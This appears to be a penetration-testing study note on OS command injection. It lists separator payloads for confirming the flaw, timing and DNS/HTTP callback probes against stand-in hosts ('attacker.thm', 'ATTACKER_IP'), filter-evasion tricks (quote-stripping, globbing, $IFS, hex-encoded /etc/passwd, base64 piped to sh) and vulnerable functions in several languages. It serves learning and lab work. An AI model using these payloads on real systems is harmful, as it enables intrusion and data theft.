# Command Injection

The application takes something you typed and hands it to a shell. A ping tool, a DNS lookup form, a file converter, an "export" button, a filename passed to a resizing library — anywhere the server builds a command string out of user input and runs it. When it works the payoff is immediate and total: you are executing as the web server user, which is the end of the web phase and the start of [[Shells]].

The decision that governs everything below is whether the output comes back to you. In-band injection prints the command's output in the response; **blind** injection prints nothing at all, and looks exactly like an input that is not vulnerable. Most of this note is about telling those two apart, because assuming the second is the first is how an afternoon disappears.

## Confirm the sink exists

```text
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 %0a id
$(id)
`id`
```

- a leading valid value → keep the original command working. Many sinks abort before reaching your payload if the first argument is nonsense, and you learn nothing from the failure
- `;` → unconditional separator: your command runs whether or not the first one succeeded. The default choice, and the one to try first
- `&&` → runs only if the first command exits `0`. Use it when `;` is filtered, but remember a failing first command now silently suppresses yours — which reads as "not vulnerable"
- `|` → pipes the first command's output into yours. It also *replaces* the visible output with your command's, which sometimes makes a result appear where `;` showed nothing
- `%0a` → a URL-encoded newline. A shell treats it as a separator, and filters that block `;` and `&` routinely forget it. **The one most often left out**
- `$(...)` and backticks → substitution rather than separation. These work in places where no separator does, because the input is being quoted into an argument rather than concatenated
- when the input lands inside quotes, close them first: `"; id; #` or `'; id; #`

## Prove blind execution

```text
; sleep 8
& ping -c 8 127.0.0.1 &
; nslookup $(whoami).probe.attacker.thm
; curl http://ATTACKER_IP/$(hostname)
```

- `sleep 8` → the timing probe. Pick a delay long enough to stand clear of normal latency; under 5 seconds is indistinguishable from a slow page on a [[Security-Terms#^vpn|VPN]]. Always request the same page once without the payload first, so you know the baseline response time
- `ping -c 8` → the Windows-and-Linux fallback when `sleep` is absent. On Windows use `ping -n 8 127.0.0.1`. Note `-c` / `-n`: without a count the ping never returns and the request hangs rather than delaying measurably
- `nslookup ... .attacker.thm` → the out-of-band probe. DNS leaves the target even when outbound HTTP is blocked, which makes it the more reliable of the two channels
- `$(whoami)` inside the hostname → smuggles the answer into the DNS query itself, so a single callback tells you both that you have execution and who you are
- listener → this only works if you are watching. `nc -lvnp 80`, a `tcpdump -i tun0 udp port 53`, or a collaborator service. **The step that is easy to skip**, and skipping it makes a successful injection look like a failed one

## Get past the filter

```text
;i''d               ;i""d              ;i\d
;/???/??t /???/p??s??
$IFS                ${IFS}             $IFS$9
$(printf '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
;echo aWQK | base64 -d | sh
```

- `i''d`, `i\d` → the shell strips empty quotes and backslash-escapes before executing, so these are all the word `id` to the shell and none of them to a blocklist matching `id`
- a blocked **command** rather than a blocked character → the blocklist knows one name; the job has many. Instead of `cat`: `less`, `more`, `head`, `tail`, `tac`, `nl`, or `grep . <file>` (skips blank lines). Instead of `ls`: `echo *` (skips dotfiles)
- `/???/??t` → glob expansion; the shell resolves the wildcards to real paths. Defeats filters matching literal command names
- `$IFS` → the internal field separator, a space by default. The escape hatch when spaces are filtered. `${IFS}` and `$IFS$9` are variants for when the bare form gets consumed by the next character
- hex via `printf` → the same trick the original note recorded: `\x2f\x65\x74\x63...` is `/etc/passwd` with nothing a path-based filter recognises
- base64 → the general form. Encode the whole payload, decode and pipe to a shell on the target. Note this needs `base64` present, and the trailing newline matters: `echo` without `-n` is usually what you want here
- URL-encode once for transport, and remember the layers: the browser or `curl` decodes once, the application may decode again. `%2520` reaching the shell as `%20` reaching as a space is a real and common two-layer case. **An unencoded `&` in a GET parameter ends your payload at that character** and the rest silently becomes another parameter

Payload reference: `https://github.com/payload-box/command-injection-payload-list`.

## Where these sinks come from

In PHP, `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()` and backticks all reach a shell, and `escapeshellarg()` / `escapeshellcmd()` are what a developer is supposed to wrap the input in. In Python it is `os.system()` and `subprocess` called with `shell=True`; the same call with a list argument and no shell is safe. In Node it is `child_process.exec()` as opposed to `execFile()`.

That distinction is worth carrying because it tells you what to grep for the moment you can read server-side source. A `system("ping -c 4 " . $_GET['host'])` in a file recovered via [[Source-Code-Disclosure]] is the whole vulnerability, already proven, with the exact parameter name handed to you.
